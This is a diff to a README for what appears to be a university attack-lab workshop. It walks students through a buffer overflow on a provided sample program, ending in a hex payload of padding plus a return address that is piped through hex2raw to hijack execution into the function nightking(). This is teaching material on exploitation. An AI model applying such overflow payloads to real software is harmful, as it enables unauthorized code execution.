@@ -5,7 +5,7 @@
 This repository contains sample code that illustrates a simple buffer overflow attack, packaged as a "tarball" (.tgz file, basically what you're working with for the attack lab).
 
 ### Step 1: Extract the files
-Download the winterfell.tgz file, and move it to the SEASnet servers (for Windows, use WinSCP; for Mac, use Cyberduck, etc.), into the folder of your choice. Change directories (by using `cd directory-name`) into that folder, then type `tar -xvf winterfell.tgz` to extract the files inside of it. You'll see the following files added to your current folder:
+Download the winterfell.tgz file, and move it to the SEASnet servers (for Windows, use WinSCP; for Mac, use `scp`, etc.), into the folder of your choice. Change directories (by using `cd directory-name`) into that folder, then type `tar -xvf winterfell.tgz` to extract the files inside of it. You'll see the following files added to your current folder:
 
 1. sample.c - source code for the demo
 2. hex2raw - executable provided by Professor Reinman; turns a .txt file representing bytes (in hex) into the corresponding ASCII versions that can be used as input for the attack lab.
@@ -76,10 +76,27 @@ We can see that the function manipulates the stack in two ways: pushing a regist
 We can create a new text file, say, "solution.txt", and put the following text into it:
 
 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00
+
 00 00 00 00 00 00 00 00
+
 32 05 40 00 00 00 00 00
 
-And then use hex2raw in order to feed this as input into the sample executable.
+And then use hex2raw in order to feed this as input into the sample executable, as follows:
+
+`$ ./hex2raw < solution.txt | ./sample`
+
+And we get the following message:
+
+![alt text](https://github.com/JuliaB1/CS33-Attack-Lab-Workshop-S19/blob/master/img/oops.PNG "sorry you had to see the segfault")
+
+Which indicates that we successfully launched the attack against nightking()!!
+
+Note: Please ignore the Segmentation fault message, because this demo doesn't do anything more with program execution after the attack is launched. Since we corrupted the stack, attempting to end the program will cause some memory issues you don't need to worry about for the lab, and as far as this demo goes, you can just ignore that segfault that the terminal displays (lol).
+
+TLDR; If you see "ATTACK SUCCESSFUL WOOHOO", you're good to go, and please don't hold that segfault against me :(
